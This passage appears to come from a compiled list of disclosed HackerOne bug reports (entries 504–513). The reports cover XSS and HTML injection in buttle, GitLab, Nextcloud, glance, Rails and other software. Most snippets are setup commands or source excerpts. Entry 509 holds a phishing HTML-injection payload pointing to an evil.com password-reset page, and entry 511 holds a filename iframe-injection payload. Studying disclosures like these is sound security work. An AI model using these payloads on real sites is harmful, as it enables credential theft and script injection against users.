$ npm i buttle
```

## 504. [#331110](https://hackerone.com/reports/331110)  -  [buttle] HTML Injection in filename leads to XSS when directory listing is displayed in the browser
*medium*

```bash
$ ./node_modules/buttle/bin/buttle -p 8080
Listening on port 8080
```

## 505. [#2257080](https://hackerone.com/reports/2257080)  -  Stored-XSS injected in Wiki page via Banzai pipeline
*high*

```ruby
# https://gitlab.com/gitlab-org/gitlab/blob/4c3239a8b20a104a15e067f208f269f65dbee927/lib/banzai/filter/references/abstract_reference_filter.rb#L116
        def call
          ...
          link_pattern_start = /\A#{link_pattern}/
          ...
          nodes.each_with_index do |node, index|
            ...
            elsif element_node?(node)
              yield_valid_link(node) do |link, inner_html|
                ...
                if link == inner_html && inner_html =~ link_pattern_start
                  replace_link_node_with_text(node, index) do
                    object_link_filter(inner_html, link_pattern, link_reference: true)
                  end


# https://gitlab.com/gitlab-org/gitlab/blob/4c3239a8b20a104a15e067f208f269f65dbee927/lib/banzai/filter/references/abstract_reference_filter.rb#L182
       def object_link_filter(text, pattern, link_content: nil, link_reference: false)
          references_in(text, pattern) do |match, id, project_ref, namespace_ref, matches|
            ...
            if object
              ... 
              link = ...

# https://gitlab.com/gitlab-org/gitlab/blob/4c3239a8b20a104a15e067f208f269f65dbee927/lib/banzai/filter/references/abstract_reference_filter.rb#L38
    def references_in(text, pattern = object_class.reference_pattern)
          text.gsub(pattern) do |match|
            if ident = identifier($~)
              yield match, ident, $~[:project], $~[:namespace], $~
            else
              match
            end
          end
        end
# … truncated …
```

## 506. [#2106708](https://hackerone.com/reports/2106708)  -  Bypass of #2035332 RXSS at image.hackerone.live via the `url` parameter
*low*

```
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
```

## 507. [#1687410](https://hackerone.com/reports/1687410)  -  [user_oidc] Stored XSS via Authorization Endpoint - Safari-Only
*low*

```console
$ docker run -p 8081:80 nextcloud:latest
```

## 508. [#254269](https://hackerone.com/reports/254269)  -  Persistent XSS found on bin.pinion.gg due to outdated FlowPlayer SWF file with Remote File Inclusion vulnerability.
*low*

```
CACHE MANIFEST
# 2014-07-07
CACHE:
http://bin.pinion.gg/bin/companions.min.js
http://bin.pinion.gg/bin/flowplayer.commercial-3.2.15.swf
http://vox-static.liverail.com/crossdomain.xml
http://cdn-static.liverail.com/crossdomain.xml
http://bs.serving-sys.com/crossdomain.xml
http://ad-apac.doubleclick.net/crossdomain.xml
http://ads.intergi.com/crossdomain.xml
http://u-ads.adap.tv/crossdomain.xml
http://imasdk.googleapis.com/js/sdkloader/ima3.js
http://www.googletagservices.com/tag/js/gpt.js
https://www.google-analytics.com/ga.js
http://partner.googleadservices.com/gpt/pubads_impl_90.js
NETWORK:
*
```

## 509. [#1108420](https://hackerone.com/reports/1108420)  -  HTML Injection on "polls" app - comments section (possibly XSS)
*low*

```
<br/> <br/><br/><br/><br/><br/><marquee><p style="color:red;"><b>!!!!! IMPORTANT message from Nextcloud administrator !!!!!!</b></p></marquee><br/><br/> A security issue was found last night.<br/> <p style="color:green;">Please go to manually on <a><b>changing-password.cloud.evil.com</a></b> to reset your password.</p> <b><p style="color:red;">Thank you in advance for doing so as soon as possible. </p></b><br/><br/><i>The IT team.</i></b><br/><br/> <br/><br/><br/> <b><marquee><p style="color:red;">!!!!! IMPORTANT message from Nextcloud administrator !!!!!!</b></p></marquee><br/><br/><br/><br/> <br/><br/>
```

## 510. [#316346](https://hackerone.com/reports/316346)  -  [public] Stored XSS in filenames in directory served by public
*low*

```bash
$ ./node_modules/public/bin/public ./ 8000
Public.js server running with "/Users/bl4de/playground/node_bugbounty_playground" on port 8000
```

## 511. [#310133](https://hackerone.com/reports/310133)  -  [glance] Stored XSS via file name allows to run arbitrary JavaScript when directory listing is displayed in browser
*low*

```
"><iframe="malicious_frame.html">
```

## 512. [#310133](https://hackerone.com/reports/310133)  -  [glance] Stored XSS via file name allows to run arbitrary JavaScript when directory listing is displayed in browser
*low*

```bash
$ npm install glance
```

## 513. [#1805893](https://hackerone.com/reports/1805893)  -  CVE-2022-23520: Incomplete fix for CVE-2022-32209 (XSS in Rails::Html::Sanitizer under certain configurations)
*medium, $2,400*

```ruby
module Rails
  module Html
    class SafeListSanitizer < Sanitizer
      ...
      def remove_safelist_tag_combinations(tags)
        if !loofah_using_html5? && tags.include?("select") && tags.include?("style")
          warn("WARNING: #{self.class}: removing 'style' from safelist, should not be combined with 'select'")
          tags.delete("style")
        end
        tags
      end

      def allowed_tags(options)
        if options[:tags]
          remove_safelist_tag_combinations(options[:tags])
        else
          self.class.allowed_tags
        end
      end
      ...
    end
  end
end
```
